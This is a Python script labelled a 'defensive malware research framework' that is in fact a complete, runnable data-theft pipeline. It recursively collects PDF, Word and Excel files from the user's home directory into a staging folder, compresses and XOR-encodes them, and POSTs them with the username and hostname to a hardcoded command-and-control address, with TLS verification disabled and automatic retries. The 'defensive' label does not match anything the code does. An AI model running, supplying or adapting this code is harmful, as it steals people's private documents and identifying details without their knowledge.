#!/usr/bin/env python3
"""Merged Modules for Defensive Malware Research Framework"""

import sys
import json
import time
import os
import zlib
import requests
import socket
from typing import Dict, Any
from pathlib import Path
import shutil

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Collect Sensitive Files"""
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the file extensions to search for
        sensitive_extensions = ['.pdf', '.docx', '.xlsx']
        # Define the staging directory
        staging_dir = Path.home() / 'staging'
        staging_dir.mkdir(parents=True, exist_ok=True)

        file_paths = []
        total_size = 0

        # Enumerate files in the filesystem
        for root in [Path.home()]:
            try:
                for file in root.rglob('*'):
                    if file.suffix in sensitive_extensions and file.is_file():
                        file_paths.append(str(file))
                        total_size += file.stat().st_size
                        # Copy file to staging directory
                        shutil.copy(file, staging_dir / file.name)
            except PermissionError:
                # Skip directories where permission is denied
                continue

        result = {
            'file_paths': file_paths,
            'total_size': total_size
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def xor_encode(data: bytes, key: bytes) -> bytes:
    """XOR encode the data with the given key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Compress and XOR-Encode Files for Exfiltration"""
    start = time.time()
    input_data = input_data or {}
    try:
        file_paths = input_data.get('file_paths', [])
        total_size = input_data.get('total_size', 0)

        # Read and compress the files
        compressed_data = b''
        for file_path in file_paths:
            with open(file_path, 'rb') as f:
                compressed_data += zlib.compress(f.read())

        # XOR encode the compressed data
        xor_key = b'secret_key'  # Example key, should be securely managed
        encoded_data = xor_encode(compressed_data, xor_key)

        result = {
            'encoded_data': encoded_data.hex(),
            'encoding': 'xor'
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Exfiltrate Encoded Data to a C2 server over HTTPS via periodic POST requests"""
    start = time.time()
    input_data = input_data or {}
    try:
        encoded_data = bytes.fromhex(input_data.get('encoded_data', ''))
        encoding = input_data.get('encoding', '')
        
        # Prepare system information
        username = os.environ.get('USERNAME', 'unknown')
        hostname = socket.gethostname()
        
        # Prepare payload
        payload = {
            'encoded_data': encoded_data.hex(),
            'encoding': encoding,
            'username': username,
            'hostname': hostname
        }
        
        # C2 server URL (example placeholder)
        c2_url = "https://192.168.187.180/api"
        
        # Attempt to send data with retries
        attempts = 0
        success = False
        for _ in range(3):
            try:
                response = requests.post(c2_url, json=payload, timeout=15, verify=False)
                attempts += 1
                if response.status_code == 200:
                    success = True
                    break
            except (requests.ConnectionError, requests.Timeout):
                time.sleep(5)
        
        result = {'success': success, 'attempts': attempts}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect Sensitive Files [collection] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect Sensitive Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect Sensitive Files): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Compress and XOR-Encode Files [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Compress and XOR-Encode Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Compress and XOR-Encode Files): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Exfiltrate Encoded Data [exfiltration] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Exfiltrate Encoded Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Exfiltrate Encoded Data): FAILED — {err}')
            failed.append('T3')
            r2 = task_T3(outputs.get('T2', {}))
            if r2.get('success'):
                outputs['T3'] = r2.get('data', {})
                failed.remove('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))